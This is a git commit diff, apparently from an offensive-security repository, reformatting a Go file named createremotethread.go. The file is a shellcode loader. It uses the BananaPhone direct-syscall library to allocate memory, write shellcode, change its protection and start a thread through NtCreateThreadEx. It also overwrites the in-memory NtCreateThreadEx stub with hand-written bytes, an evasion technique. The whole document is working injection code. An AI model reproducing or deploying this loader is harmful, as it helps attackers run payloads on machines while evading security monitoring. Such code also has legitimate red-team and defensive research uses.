4498fe920ba3b904f134262985cbaf4472626dfd
D3Ext <67125397+D3Ext@users.noreply.github.com>
2023-01-15 22:06:41 +0100

    Update createremotethread.go

--- shellcode/createremotethread.go
+++ shellcode/createremotethread.go
@@ -1,41 +1,40 @@
 package shellcode
 
 import (
-  "fmt"
-  bap "github.com/C-Sto/BananaPhone/pkg/BananaPhone"
-  "unsafe"
-  "syscall"
-  "golang.org/x/sys/windows"
-  //"errors"
+	"fmt"
+	bap "github.com/C-Sto/BananaPhone/pkg/BananaPhone"
+	"unsafe"
+	"syscall"
+	"golang.org/x/sys/windows"
 )
 
 func CreateThread(shellcode []byte, handle uintptr, NtAllocateVirtualMemorySysid, NtProtectVirtualMemorySysid, NtCreateThreadExSysid uint16) {
-  const (
-    thisThread = uintptr(0xffffffffffffffff)
-    memCommit  = uintptr(0x00001000)
-    memreserve = uintptr(0x00002000)
-  )
+	const (
+		thisThread = uintptr(0xffffffffffffffff)
+		memCommit  = uintptr(0x00001000)
+		memreserve = uintptr(0x00002000)
+	)
 
-  var baseA uintptr
-  regionsize := uintptr(len(shellcode))
-  r1, r := bap.Syscall(
-    NtAllocateVirtualMemorySysid,
-    handle,
-    uintptr(unsafe.Pointer(&baseA)),
-    0,
-    uintptr(unsafe.Pointer(&regionsize)),
-    uintptr(memCommit|memreserve),
-    syscall.PAGE_READWRITE,
-  )
-  if r != nil {
-    fmt.Printf("1 %s %x\n", r, r1)
-    return
-  }
-  bap.WriteMemory(shellcode, baseA)
+	var baseA uintptr
+	regionsize := uintptr(len(shellcode))
+	r1, r := bap.Syscall(
+		NtAllocateVirtualMemorySysid,
+		handle,
+		uintptr(unsafe.Pointer(&baseA)),
+		0,
+		uintptr(unsafe.Pointer(&regionsize)),
+		uintptr(memCommit|memreserve),
+		syscall.PAGE_READWRITE,
+	)
+	if r != nil {
+		fmt.Printf("1 %s %x\n", r, r1)
+		return
+	}
+	bap.WriteMemory(shellcode, baseA)
 
-  var oldprotect uintptr
-  r1, r = bap.Syscall(
-    NtProtectVirtualMemorySysid,
+	var oldprotect uintptr
+	r1, r = bap.Syscall(
+		NtProtectVirtualMemorySysid,
 		handle,
 		uintptr(unsafe.Pointer(&baseA)),
 		uintptr(unsafe.Pointer(&regionsize)),
@@ -43,21 +42,21 @@ func CreateThread(shellcode []byte, handle uintptr, NtAllocateVirtualMemorySysid
 		uintptr(unsafe.Pointer(&oldprotect)),
 	)
 	var hhosthread uintptr
-  r1, r = bap.Syscall(
-    NtCreateThreadExSysid,
+	r1, r = bap.Syscall(
+		NtCreateThreadExSysid,
 		uintptr(unsafe.Pointer(&hhosthread)),
 		0x1FFFFF,
 		0,
 		handle,
 		baseA,
 		0,
-    uintptr(0),
+		uintptr(0),
 		0,
 		0,
 		0,
-    0,
-  )
-  syscall.WaitForSingleObject(syscall.Handle(hhosthread), 0xffffffff)
+		0,
+	)
+	syscall.WaitForSingleObject(syscall.Handle(hhosthread), 0xffffffff)
 }
 
 
@@ -67,24 +66,26 @@ func CreateRemoteThread(shellcode []byte) (error) {
 
 	bp, e := bap.NewBananaPhone(bap.AutoBananaPhoneMode)
 	if e != nil {
-    return e
-  }
-	mess, e := bp.GetFuncPtr("NtCreateThreadEx")
-	if e != nil {
-    return e
+		return e
 	}
 	
-  oldProtect := windows.PAGE_EXECUTE_READ
+	mess, e := bp.GetFuncPtr("NtCreateThreadEx")
+	if e != nil {
+		return e
+	}
+	
+	oldProtect := windows.PAGE_EXECUTE_READ
 	VirtualProtectEx.Call(uintptr(0xffffffffffffffff), uintptr(mess), uintptr(0x100), windows.PAGE_EXECUTE_READWRITE, uintptr(unsafe.Pointer(&oldProtect)))
 	
-  bap.WriteMemory([]byte{0x90, 0x90, 0x4c, 0x8b, 0xd1, 0xb8, 0xc1, 0x00, 0x00, 0x00, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90}, uintptr(mess))
+	bap.WriteMemory([]byte{0x90, 0x90, 0x4c, 0x8b, 0xd1, 0xb8, 0xc1, 0x00, 0x00, 0x00, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90}, uintptr(mess))
+	
 	alloc, e := bp.GetSysID("NtAllocateVirtualMemory")
 	if e != nil {
-    return e
+		return e
 	}
 	protect, e := bp.GetSysID("NtProtectVirtualMemory")
 	if e != nil {
-    return e
+		return e
 	}
 	createthread, e := bp.GetSysID("NtCreateThreadEx")
 	if e != nil {
@@ -92,7 +93,7 @@ func CreateRemoteThread(shellcode []byte) (error) {
 	}
 
 	CreateThread(shellcode, uintptr(0xffffffffffffffff), alloc, protect, createthread)
-  return nil
+	return nil
 }
 
 
